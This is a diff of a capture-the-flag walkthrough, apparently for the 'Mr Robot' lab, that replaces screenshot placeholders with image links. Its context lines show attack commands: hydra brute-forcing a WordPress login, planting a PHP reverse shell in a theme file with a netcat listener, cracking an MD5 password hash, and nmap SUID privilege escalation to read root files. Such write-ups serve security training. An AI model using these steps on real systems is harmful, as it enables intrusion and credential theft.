@@ -17,7 +17,7 @@ nmap -p- -Pn <IP>
 - `-p-`: Allow us to scan all 65535 TCP ports
 - `-Pn`: Skips the host discovery process (ping scan)
 
-[SCREEN01]
+![SCREEN01](https://github.com/user-attachments/assets/70a1f790-0fbc-417e-94bc-147c59b2e52b)
 
 2. Enumerate directories with gobuster
 
@@ -52,7 +52,7 @@ wc -w fsocity-unique.dic
 
 3. While logging in to `http://<IP>/wp-login` in DevTools -> Network we can see the Request parameters
 
-[SCREEN02]
+![SCREEN02](https://github.com/user-attachments/assets/ea686888-9b26-431c-a2c1-509a77e273cf)
 
 4. hydra payload time:
 
@@ -64,7 +64,7 @@ hydra -L fsocity-unique.dic -p test <IP> http-post-form "/wp-login.php:log=^USER
 - `-p`: Uses a single password for all attempts
 - `-t`: Number of parallel connections to use for the attack
 
-[SCREEN03]
+![SCREEN03](https://github.com/user-attachments/assets/27d74201-63ce-4e5f-bce6-08d8c88297f1)
 
 5. With the correct username, the error changes to '**ERROR: The password you entered for the username is incorrect.**'
 
@@ -76,7 +76,7 @@ hydra -l elliot -P fsocity-unique.dic <IP> http-post-form "/wp-login.php:log=^US
 - `-P`: Specifies a list of passwords to try from the file
 - `-t`: Number of parallel connections to use for the attack
 
-[SCREEN04]
+![SCREEN04](https://github.com/user-attachments/assets/f4d896c5-11de-47bf-a840-d24504aba526)
 
 6. After logging in, set the netcat listener, get php reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), and paste to archive.php in Appearance -> Editor view. Update file (remember to change `$ip` and `$port`) and go to the `http://<IP>/wp-content/themes/twentyfifteen/archive.php` to activate the reverse shell
 
@@ -89,7 +89,7 @@ nc -lvnp 4444
 - `-n`: Skip DNS lookup
 - `-p`: Specify the port number to listen on
 
-[SCREEN05]
+![SCREEN05](https://github.com/user-attachments/assets/dd242322-9f25-44f7-a798-d2ec7b00b77b)
 
 7. In home/robot there are two files `key-2-of-3.txt` and `password.raw-md5`. Unfortunately we don't have access premission to access second flag as of now, but we can crack the MD5 password and try as a robot user
 
@@ -99,7 +99,7 @@ cat home/robot/key-2-of-3.txt
 cat home/robot/password.raw-md5
 ```
 
-[SCREEN06]
+![SCREEN06](https://github.com/user-attachments/assets/cc3c1ed8-6a65-4f44-8fba-76f03059d77a)
 
 8. Crack the password using [Crack Station](https://crackstation.net/) and login as robot and get the flag
 
@@ -110,7 +110,7 @@ pwd
 cat home/robot/key-2-of-3.txt
 ```
 
-[SCREEN07]
+![SCREEN07](https://github.com/user-attachments/assets/65af9fef-32cc-4575-a435-fc722c557572)
 
 ### What is key 3?
 
@@ -122,7 +122,7 @@ Hint: nmap
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-[SCREEN08]
+![SCREEN08](https://github.com/user-attachments/assets/d7732b8d-9aa5-4b37-a650-e2d4e4ea46dc)
 
 2. Check [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/) for nmap, go to the nmap directory and follow the instructions
 
@@ -133,4 +133,5 @@ nmap --interactive
 cat /root/key-3-of-3.txt
 ```
 
-[SCREEN09]
+![SCREEN09](https://github.com/user-attachments/assets/7b793ef0-1434-4ad0-83b6-af72c2daf145)
+
